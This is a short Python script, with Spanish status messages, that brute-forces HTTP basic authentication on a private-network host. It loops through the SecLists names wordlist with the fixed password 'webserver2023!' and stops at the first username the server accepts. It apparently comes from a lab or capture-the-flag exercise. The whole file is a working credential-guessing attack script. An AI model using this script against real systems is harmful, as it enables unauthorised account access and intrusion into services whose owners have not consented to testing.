#!/usr/bin/python3
from pwn import log
import requests

bar = log.progress("")
counter = 1

target = "http://192.168.193.131/"

with open("/usr/share/seclists/Usernames/Names/names.txt", "r") as file:
    for line in file:
        user = line.strip()
        bar.status(f"Probando usuario [{counter}/10177]: {user}")
        request = requests.get(target, auth=(user, "webserver2023!"))
        counter += 1

        if request.status_code == 200:
            bar.success(f"El usuario {user} es válido")
            exit(0)
